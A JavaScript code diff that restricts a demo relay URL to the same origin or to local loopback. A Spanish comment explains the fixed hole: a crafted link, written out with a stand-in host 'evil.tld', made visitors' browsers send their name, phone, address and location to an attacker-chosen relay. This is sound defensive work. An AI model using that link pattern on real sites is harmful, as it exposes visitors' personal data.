@@ -428,16 +428,64 @@ function relayHttpError(status) {
   return error;
 }
 
+const LOOPBACK_HOSTS = new Set(['localhost', '127.0.0.1', '[::1]', '::1']);
+
+function isLoopback(hostname) {
+  return LOOPBACK_HOSTS.has(String(hostname || '').toLowerCase());
+}
+
+/*
+ * DE DÓNDE PUEDE VENIR EL RELAY DE LA DEMO
+ *
+ * Antes esta función sólo exigía http/https, así que `?relay=` aceptaba
+ * CUALQUIER host. Sobre el dominio del comercio, un enlace preparado
+ * —`https://<comercio>/?demo=1&relay=https://evil.tld&key=<64 hex>`— alcanzaba
+ * para dos cosas:
+ *
+ *   1. el navegador de la persona publicaba el snapshot de la sesión a ese host
+ *      (`/publish`), y ese snapshot lleva nombre, teléfono, dirección, latitud,
+ *      longitud y precisión de la ubicación;
+ *   2. el mismo host contestaba `/events` y `/snapshot`, o sea que decidía qué
+ *      pedidos y qué estados veía la persona EN LA PÁGINA DEL COMERCIO, y podía
+ *      vaciarle la sesión con un `kind:'reset'`.
+ *
+ * La clave que habilita el canal la elige quien arma el enlace, así que no
+ * protegía nada: sesenta y cuatro hexadecimales cualesquiera pasan el patrón.
+ *
+ * QUÉ SE PERMITE AHORA Y POR QUÉ ESE CONJUNTO
+ *
+ * El mismo origen, siempre. Y además un relay en loopback SÓLO cuando la propia
+ * página también está en loopback, que es el caso de desarrollo real: el gate
+ * sirve el sitio en 127.0.0.1:8xxx y el relay en 127.0.0.1:18xxx —mismo host,
+ * otro puerto, o sea otro origen—. Sobre un dominio publicado esa segunda
+ * puerta no aplica, así que ahí sólo entra el mismo origen y el enlace
+ * preparado deja de funcionar.
+ */
 function sanitizeRelayBase(value) {
   const raw = String(value || '').trim().replace(/\/+$/, '');
   if (!raw) return '';
   try {
-    const parsed = new URL(raw, globalThis.location?.href || 'http://localhost/');
+    const aqui = globalThis.location;
+    const parsed = new URL(raw, aqui?.href || 'http://localhost/');
     if (!['http:', 'https:'].includes(parsed.protocol)) return '';
+
+    const mismoOrigen = Boolean(aqui?.origin) && parsed.origin === aqui.origin;
+    const desarrolloLocal = isLoopback(parsed.hostname) && isLoopback(aqui?.hostname);
+    if (!mismoOrigen && !desarrolloLocal) return '';
+
     return parsed.origin + parsed.pathname.replace(/\/+$/, '');
   } catch (_) {
     return '';
   }
+}
+
+/**
+ * La misma compuerta, para quien tenga que resolver el relay desde afuera.
+ * `clearRelayRoomOnReset` usaba el valor CRUDO de la URL y hacía `fetch` contra
+ * él: el mismo agujero por otra puerta.
+ */
+export function resolveRelayBase(value) {
+  return sanitizeRelayBase(value);
 }
 
 function sanitizeRoom(value) {
